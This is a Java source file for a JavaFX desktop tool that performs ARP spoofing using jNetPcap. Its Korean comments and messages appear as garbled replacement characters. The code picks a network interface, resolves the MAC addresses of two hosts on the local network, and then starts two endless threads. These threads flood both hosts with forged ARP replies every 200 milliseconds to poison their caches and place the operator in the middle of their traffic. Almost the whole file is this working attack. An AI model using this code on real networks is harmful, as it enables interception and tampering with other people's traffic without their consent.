package controller;

import java.net.InetAddress;
import java.net.URL;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.ResourceBundle;
import org.jnetpcap.Pcap;
import org.jnetpcap.PcapHeader;
import org.jnetpcap.PcapIf;
import org.jnetpcap.nio.JBuffer;
import org.jnetpcap.nio.JMemory;
import org.jnetpcap.packet.JRegistry;
import org.jnetpcap.packet.Payload;
import org.jnetpcap.packet.PcapPacket;
import org.jnetpcap.packet.format.FormatUtils;
import org.jnetpcap.protocol.lan.Ethernet;
import org.jnetpcap.protocol.network.Ip4;
import org.jnetpcap.protocol.tcpip.Tcp;

import com.sun.javafx.image.impl.ByteIndexed.Getter;

import javafx.application.Platform;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.fxml.FXML;
import javafx.fxml.Initializable;
import javafx.scene.control.Button;
import javafx.scene.control.Label;
import javafx.scene.control.ListView;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import model.ARP;
import model.Util;

public class Controller implements Initializable {
	@FXML
	private ListView<String> networklistView;
	@FXML
	private Button pickButton;
	@FXML
	private TextArea textarea;
	@FXML
	private TextField myIP;

	@FXML
	private TextField SenderIP;

	@FXML
	private TextField TargetIP; // ������ IP

	@FXML
	private Button getMACButton; //

	ObservableList<String> networkList = FXCollections.observableArrayList(); // list�信 ��� ����Ʈ
	ArrayList<PcapIf> allDEVS = new ArrayList<PcapIf>();

	@Override
	public void initialize(URL location, ResourceBundle resources) {

		StringBuilder errbuf = new StringBuilder(); // �����޼����� ������ؼ� ����

		int r = Pcap.findAllDevs(allDEVS, errbuf); // ��Ʈ��ũ ��� ����ش�.
		if (r == Pcap.NOT_OK || allDEVS.isEmpty()) {
			textarea.appendText("��Ʈ��ũ ��ġ�� ã���� �����ϴ�." + errbuf.toString());
			return;
		}
		textarea.appendText("��Ʈ��ũ ��ġ�� ã�ҽ��ϴ�.\n���Ͻô� ��ġ�� ������ �ּ���.\n");
		for (PcapIf device : allDEVS) { // ����Ʈ��ũ�� ����̽��� ���ؼ� Ž���� ������ ��ġ�� ���� �ΰ��� �ƴѰ��� ���� ��ġ�� ������ ����ش�.

			networkList.add(device.getName() + " "
					+ ((device.getDescription() != null) ? device.getDescription() : "��� ���� ������ �����ϴ�."));

		}
		networklistView.setItems(networkList);
	}

	public void networkPickAction() {
		if (networklistView.getSelectionModel().getSelectedIndex() < 0) {
			return;
		}
		Main.device = allDEVS.get(networklistView.getSelectionModel().getSelectedIndex());
		networklistView.setDisable(true);
		pickButton.setDisable(true);

		int snaplen = 64 * 1024;
		int flags = Pcap.MODE_NON_PROMISCUOUS;
		int timeout = 1000;
		StringBuilder errbuf = new StringBuilder();
		Main.pcap = Pcap.openLive(Main.device.getName(), snaplen, flags, timeout, errbuf);
		if (Main.pcap == null) {
			textarea.appendText("��Ʈ��ũ ��ġ�� ���������ϴ�." + errbuf.toString() + "\n");
			return;
		}
		textarea.appendText("��������ġ : " + Main.device.getName() + "\n");
		textarea.appendText("��Ʈ��ũ��ġ�� Ȱ��ȭ �߽��ϴ�.\n");

	}

	// start ��ư�� ��������
	public void getMACAction() {
		if (!pickButton.isDisable()) {
			textarea.appendText("��ġ�� �������ּ���.\n");
		}

		ARP arp = new ARP();
		Ethernet eth = new Ethernet(); // 2����
		Ip4 ip = new Ip4(); // 3����
		Tcp tcp = new Tcp(); // 4����

		Payload payload = new Payload(); // �����͸� �ְ������ �������� ����

		PcapHeader header = new PcapHeader(JMemory.POINTER); // ĸó�� ��Ŷ�� ������� �������

		JBuffer buf = new JBuffer(JMemory.POINTER); // ��Ŷ���ù���
		ByteBuffer buffer = null;
		int id = JRegistry.mapDLTToId(Main.pcap.datalink()); // JRegistry���� ���ε� ���� �����´�. ��Ĺ�� �����͸�ũ Ÿ���� ......
		// ��Ŷ�� ĸó�ϰ� �ٷ��.
		try {
			Main.myMac = Main.device.getHardwareAddress();
			Main.myIP = InetAddress.getByName((myIP.getText())).getAddress();
			Main.senderIP = InetAddress.getByName((SenderIP.getText())).getAddress();
			Main.targetIP = InetAddress.getByName((TargetIP.getText())).getAddress();
		} catch (Exception e) {
			textarea.appendText("ip�ּҰ� �߸��Ǿ����ϴ�.\n");
			return;
		}
		myIP.setDisable(true);
		SenderIP.setDisable(true);
		TargetIP.setDisable(true);
		getMACButton.setDisable(true);
		arp = new ARP();
		arp.makeARPRequest(Main.myMac, Main.myIP, Main.targetIP); // ������� ���ּҸ� ����������ؼ�
		buffer = ByteBuffer.wrap(arp.getPacket());
		if (Main.pcap.sendPacket(buffer) != Pcap.OK) {
			System.out.println(Main.pcap.getErr());
		}
		textarea.appendText("ŸŶ���� ARP Request�� ���½��ϴ�.\n" + Util.bytestoString(arp.getPacket()) + "\n");

		long targertStartTime = System.currentTimeMillis();
		Main.targetMAC = new byte[6];
		while (Main.pcap.nextEx(header, buf) != Pcap.NEXT_EX_NOT_OK) {
			if (System.currentTimeMillis() - targertStartTime >= 500) {
				textarea.appendText("Ÿ���� �������� �ʽ��ϴ�. \n");
				return;
			}
			PcapPacket packet = new PcapPacket(header, buf); // ��Ŷ�� ��� packet ����
			packet.scan(id); // id�� �̿��ؼ� ��Ŷ�� ĸó
			byte[] sourceIP = new byte[4]; // ������� ip�� ����ش�
			System.arraycopy(packet.getByteArray(0, packet.size()), 28, sourceIP, 0, 4);
			if (packet.getByte(12) == 0x08 && packet.getByte(13) == 0x06 // ARP��Ŷ����
					&& packet.getByte(20) == 0x00 && packet.getByte(21) == 0x02 // Reply
					&& Util.bytestoString(sourceIP).equals(Util.bytestoString(Main.targetIP)) // ���� �ҽ� ip == ���� ���ϴ�
																								// ip����
					&& packet.hasHeader(eth)) // 2��������
			{
				Main.targetMAC = eth.source(); // Ÿ�ϸ�
				break;
			} else {
				continue;
			}
		}
		textarea.appendText("Ÿ�� �� �ּ� :" + Util.bytestoString(Main.targetMAC) + "\n");

		arp = new ARP();
		arp.makeARPRequest(Main.myMac, Main.myIP, Main.senderIP);
		buffer = ByteBuffer.wrap(arp.getPacket());
		if (Main.pcap.sendPacket(buffer) != Pcap.OK) {
			System.out.println(Main.pcap.getErr());
		}
		textarea.appendText("�������� ARP Request�� ���½��ϴ�.\n" + Util.bytestoString(arp.getPacket()) + "\n");

		Main.senderMAC = new byte[6];
		long SenderStartTime = System.currentTimeMillis();
		while (Main.pcap.nextEx(header, buf) != Pcap.NEXT_EX_NOT_OK) {
			if (System.currentTimeMillis() - SenderStartTime >= 500) {
				textarea.appendText("Ÿ���� �������� �ʽ��ϴ�. \n");
				return;
			}
			PcapPacket packet = new PcapPacket(header, buf); // ��Ŷ�� ��� packet ����
			packet.scan(id); // id�� �̿��ؼ� ��Ŷ�� ĸó
			byte[] sourceIP = new byte[4]; // ������� ip�� ����ش�
			System.arraycopy(packet.getByteArray(0, packet.size()), 28, sourceIP, 0, 4);
			if (packet.getByte(12) == 0x08 && packet.getByte(13) == 0x06 // ARP��Ŷ����
					&& packet.getByte(20) == 0x00 && packet.getByte(21) == 0x02 // Reply
					&& Util.bytestoString(sourceIP).equals(Util.bytestoString(Main.senderIP)) // ���� �ҽ� ip == ���� ���ϴ�ip����
					&& packet.hasHeader(eth)) // 2��������
			{
				Main.senderMAC = eth.source(); // Ÿ�ϸ�
				break;
			} else {
				continue;
			}
		}
		textarea.appendText("���� �� �ּ� :" + Util.bytestoString(Main.senderMAC) + "\n");

		new SenderARPSpoofing().start();
		new TargetARPSpoofing().start();

	}

	class SenderARPSpoofing extends Thread {

		@Override
		public void run() {
			ARP arp = new ARP();
			arp.makeARPReply(Main.senderMAC, Main.myMac, Main.myMac, Main.targetIP, Main.targetMAC, Main.senderIP);
			Platform.runLater(() -> {
				textarea.appendText("���Ϳ��� ������ ARP Reply ��Ŷ�� ����ؼ� �����մϴ�. \n");
			});
			while (true) {
				ByteBuffer buffer = ByteBuffer.wrap(arp.getPacket());
				Main.pcap.sendPacket(buffer);
				try {
					Thread.sleep(200);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}
	}

	class TargetARPSpoofing extends Thread {

		@Override
		public void run() {
			ARP arp = new ARP();
			arp.makeARPReply(Main.targetMAC, Main.myMac, Main.myMac, Main.senderIP, Main.targetMAC, Main.targetIP);
			Platform.runLater(() -> {
				textarea.appendText("Ÿ�Ͽ��� ������ ARP Reply ��Ŷ�� ����ؼ� �����մϴ�. \n");
			});
			while (true) {
				ByteBuffer buffer = ByteBuffer.wrap(arp.getPacket());
				Main.pcap.sendPacket(buffer);
				try {
					Thread.sleep(200);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}
	}

}
